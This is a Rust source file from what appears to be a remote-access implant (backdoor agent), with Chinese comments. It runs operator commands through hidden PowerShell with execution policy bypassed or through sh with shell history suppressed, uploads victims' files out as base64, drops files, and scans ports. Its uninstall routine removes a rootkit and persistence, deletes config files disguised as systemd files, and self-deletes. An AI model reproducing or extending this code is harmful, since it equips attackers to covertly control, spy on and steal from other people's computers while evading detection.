use std::process::Command;

pub fn execute_command(cmd: &str) -> String {
    let mut cmd = cmd.to_string();
    let mut is_interactive = false;

    // 检测交互模式前缀
    if cmd.starts_with("interactive:") {
        is_interactive = true;
        cmd = cmd.strip_prefix("interactive:").unwrap().to_string();
    }

    // 特殊命令处理
    if cmd.starts_with("uninstall") {
        return handle_uninstall();
    }

    if cmd.starts_with("ls") {
        let path = cmd.strip_prefix("ls").unwrap().trim();
        return crate::files::list_files(path);
    }
    if cmd.starts_with("dir") {
        let path = cmd.strip_prefix("dir").unwrap().trim();
        return crate::files::list_files(path);
    }

    // 文件上传: upload /path/to/file
    if cmd.starts_with("upload ") {
        let path = cmd.strip_prefix("upload ").unwrap().trim();
        return match crate::filetransfer::upload_file(path) {
            Ok(base64) => format!("[FILE_UPLOAD]\n{}", base64),
            Err(e) => e,
        };
    }

    // 文件下载: download /path/to/save base64data...
    if cmd.starts_with("download ") {
        let parts: Vec<&str> = cmd.splitn(3, ' ').collect();
        if parts.len() == 3 {
            return match crate::filetransfer::download_file(parts[1], parts[2]) {
                Ok(msg) => msg,
                Err(e) => e,
            };
        }
        return "Usage: download /path/to/save <base64data>".to_string();
    }

    // 端口扫描: scan host ports
    if cmd.starts_with("scan ") {
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.len() >= 3 {
            return crate::scan::scan_ports(parts[1], parts[2]);
        }
        return "Usage: scan <host> <ports>".to_string();
    }

    #[cfg(windows)]
    let output = {
        use std::os::windows::process::CommandExt;

        if cmd.starts_with("cmd:") {
            let actual_cmd = &cmd[4..];
            let mut command = Command::new("cmd");
            command.args(&["/c", actual_cmd]);
            if !is_interactive {
                command.creation_flags(0x08000000);
            }
            command.output()
        } else {
            let mut command = Command::new("powershell");
            command.arg("-NoProfile");
            if !is_interactive {
                command.arg("-NonInteractive");
            }
            command.args(&["-ExecutionPolicy", "Bypass", "-Command", &cmd]);
            if !is_interactive {
                command.creation_flags(0x08000000);
            }
            command.output()
        }
    };

    #[cfg(unix)]
    let output = {
        let has_timeout = Command::new("which")
            .arg("timeout")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);

        let mut command = if has_timeout {
            let mut c = Command::new("timeout");
            c.args(&["120", "sh", "-c", &cmd]);
            c
        } else {
            let mut c = Command::new("sh");
            c.args(&["-c", &cmd]);
            c
        };

        if !is_interactive {
            command.env("HISTFILE", "/dev/null");
        }
        command.output()
    };

    match output {
        Ok(o) => {
            let mut result = String::from_utf8_lossy(&o.stdout).to_string();
            result.push_str(&String::from_utf8_lossy(&o.stderr));

            if result.len() > 102400 {
                format!("{}...\n[Output truncated]", &result[..102400])
            } else {
                result
            }
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn handle_uninstall() -> String {
    // 清理 rootkit
    #[cfg(unix)]
    {
        let _ = crate::rootkit::uninstall_rootkit();
    }

    // 清理持久化
    let _ = crate::persist::uninstall_persistence();

    // 删除配置文件
    #[cfg(windows)]
    {
        let username = whoami::username();
        let _ = std::fs::remove_file(format!(
            r"C:\Users\{}\AppData\Local\.config\issue.txt",
            username
        ));
        let _ = std::fs::remove_file(format!(
            r"C:\Users\{}\AppData\Local\.config\agent_id.txt",
            username
        ));
        let _ = std::fs::remove_file(format!(
            r"C:\Users\{}\AppData\Local\.config\agent_debug.log",
            username
        ));
    }

    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            let _ = std::fs::remove_file("/var/lib/systemd/.issue");
            let _ = std::fs::remove_file("/var/lib/systemd/.agent_id");
            let _ = std::fs::remove_file("/var/log/.systemd-debug.log");
        } else {
            let home = std::env::var("HOME").unwrap_or_default();
            let _ = std::fs::remove_file(format!("{}/.local/share/.issue", home));
            let _ = std::fs::remove_file(format!("{}/.local/share/.agent_id", home));
            let _ = std::fs::remove_file(format!("{}/.local/share/.agent-debug.log", home));
        }
    }

    // 自删除并退出
    std::thread::spawn(|| {
        std::thread::sleep(std::time::Duration::from_secs(2));
        let _ = crate::selfdel::self_delete();
        std::process::exit(0);
    });

    "Uninstalling...".to_string()
}
